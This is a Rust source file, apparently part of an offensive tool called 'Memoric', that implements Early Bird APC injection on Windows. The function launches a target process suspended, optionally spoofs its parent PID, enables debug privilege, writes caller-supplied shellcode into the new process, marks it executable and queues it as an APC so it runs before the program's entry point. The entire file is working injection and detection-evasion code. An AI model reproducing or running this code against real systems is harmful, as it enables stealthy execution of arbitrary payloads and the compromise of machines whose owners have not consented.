//! Early Bird APC Injection - inject before process main thread starts

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Early Bird APC Injection - queue APC to suspended process before it starts
pub fn early_bird_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PWSTR;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
        OpenProcess, QueueUserAPC, ResumeThread, UpdateProcThreadAttribute, CREATE_SUSPENDED,
        EXTENDED_STARTUPINFO_PRESENT, LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_CREATE_PROCESS,
        PROCESS_INFORMATION, STARTUPINFOEXW, STARTUPINFOW,
    };

    let target_exe = args
        .get("target_exe")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing target_exe".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let ppid = args.get("ppid").and_then(|v| v.as_u64());

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Early Bird APC: {} ({} bytes)",
        target_exe,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut cmd_line: Vec<u16> = target_exe
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let creation_flags = CREATE_SUSPENDED;

        // PPID spoofing if requested
        let (use_extended, attr_list, _attr_buf, parent_handle) = if let Some(parent_pid) = ppid {
            let parent =
                OpenProcess(PROCESS_CREATE_PROCESS, false, parent_pid as u32).map_err(|e| {
                    MemoricError::WindowsApi(format!(
                        "Failed to open parent PID {}: {}",
                        parent_pid, e
                    ))
                })?;
            let parent = SafeHandle::new(parent);

            let mut size = 0usize;
            let _ = InitializeProcThreadAttributeList(
                LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
                1,
                0,
                &mut size,
            );
            let mut attr_buf = vec![0u8; size];
            let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);

            InitializeProcThreadAttributeList(attr_list, 1, 0, &mut size).map_err(|e| {
                MemoricError::WindowsApi(format!("InitializeProcThreadAttributeList: {}", e))
            })?;

            let mut parent_raw = (*parent).0 as isize;
            UpdateProcThreadAttribute(
                attr_list,
                0,
                0x00020000,
                Some(&mut parent_raw as *mut _ as *mut _),
                std::mem::size_of::<isize>(),
                None,
                None,
            )
            .map_err(|e| MemoricError::WindowsApi(format!("UpdateProcThreadAttribute: {}", e)))?;

            (true, Some(attr_list), Some(attr_buf), Some(parent))
        } else {
            (false, None, None, None)
        };

        let result = if use_extended {
            let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
            si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
            si_ex.lpAttributeList = attr_list.unwrap();

            CreateProcessW(
                None,
                PWSTR(cmd_line.as_mut_ptr()),
                None,
                None,
                false,
                creation_flags | EXTENDED_STARTUPINFO_PRESENT,
                None,
                None,
                &si_ex.StartupInfo,
                &mut pi,
            )
        } else {
            CreateProcessW(
                None,
                PWSTR(cmd_line.as_mut_ptr()),
                None,
                None,
                false,
                creation_flags,
                None,
                None,
                &si,
                &mut pi,
            )
        };

        if let Some(al) = attr_list {
            DeleteProcThreadAttributeList(al);
        }
        drop(parent_handle);

        result.map_err(|e| MemoricError::WindowsApi(format!("CreateProcessW failed: {}", e)))?;

        let process = SafeHandle::new(pi.hProcess);
        let thread = SafeHandle::new(pi.hThread);

        // Allocate RW memory
        let remote_mem = VirtualAllocEx(
            *process,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }

        // Write shellcode
        WriteProcessMemory(
            *process,
            remote_mem,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;

        // Change to RX (W^X compliant)
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *process,
            remote_mem,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx: {}", e)))?;

        // Queue APC to suspended main thread — QueueUserAPC returns u32, check != 0
        let apc_result = QueueUserAPC(Some(std::mem::transmute(remote_mem)), *thread, 0);
        if apc_result == 0 {
            return Err(MemoricError::InjectionFailed(
                "QueueUserAPC failed".to_string(),
            ));
        }

        // Resume thread - APC fires before entry point
        ResumeThread(*thread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "early_bird_apc",
            "pid": pi.dwProcessId,
            "tid": pi.dwThreadId,
            "shellcode_address": format!("0x{:016X}", remote_mem as usize),
            "ppid_spoofed": ppid.is_some(),
            "message": "APC queued to suspended thread - fires before process entry point"
        }))
    }
}
